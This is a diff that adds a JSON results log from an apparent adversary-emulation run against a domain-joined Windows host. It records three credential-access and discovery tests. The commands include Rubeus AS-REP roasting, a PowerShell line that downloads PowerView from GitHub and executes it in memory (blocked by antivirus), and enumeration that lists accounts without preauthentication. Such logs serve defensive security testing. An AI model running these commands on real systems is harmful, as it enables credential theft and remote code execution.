@@ -1,0 +1,90 @@
+{
+  "job_id": "a1cc8a5c-9f5e-4148-bb3f-1cc5dc1b5f6a",
+  "targets": [
+    {
+      "target_id": "tgt-1",
+      "name": "localhost",
+      "os_platform": "windows",
+      "privilege": "admin",
+      "connection": "remote",
+      "domain_joined": true,
+      "host": "192.168.50.162",
+      "notes": ""
+    }
+  ],
+  "summary": {
+    "target_count": 1,
+    "total_tests": 3,
+    "succeeded": 2,
+    "failed": 1,
+    "skipped": 0
+  },
+  "by_target": [
+    {
+      "target": {
+        "target_id": "tgt-1",
+        "name": "localhost",
+        "os_platform": "windows",
+        "privilege": "admin",
+        "connection": "remote",
+        "domain_joined": true,
+        "host": "192.168.50.162",
+        "notes": ""
+      },
+      "summary": {
+        "total_tests": 3,
+        "succeeded": 2,
+        "failed": 1,
+        "skipped": 0,
+        "tactics_tested": [
+          "credential-access",
+          "discovery"
+        ]
+      },
+      "results": [
+        {
+          "technique_id": "T1558.004",
+          "test_name": "Rubeus asreproast",
+          "tactic": "credential-access",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "",
+          "command_executed": "cmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asreproast /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"\n",
+          "duration_ms": 2375,
+          "timestamp": "2026-06-13T07:44:00.027106"
+        },
+        {
+          "technique_id": "T1558.004",
+          "test_name": "Get-DomainUser with PowerView",
+          "tactic": "credential-access",
+          "success": false,
+          "exit_code": 1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "At line:1 char:1\r\n+ #requires -version 2\r\n+ ~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.",
+          "command_executed": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n",
+          "duration_ms": 2015,
+          "timestamp": "2026-06-13T07:44:02.051152"
+        },
+        {
+          "technique_id": "T1069.002",
+          "test_name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
+          "tactic": "discovery",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\nname       \n----       \nsvc_backup \nsvc_monitor\n\n",
+          "stderr": "",
+          "command_executed": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n",
+          "duration_ms": 1047,
+          "timestamp": "2026-06-13T07:44:03.089657"
+        }
+      ]
+    }
+  ]
+}
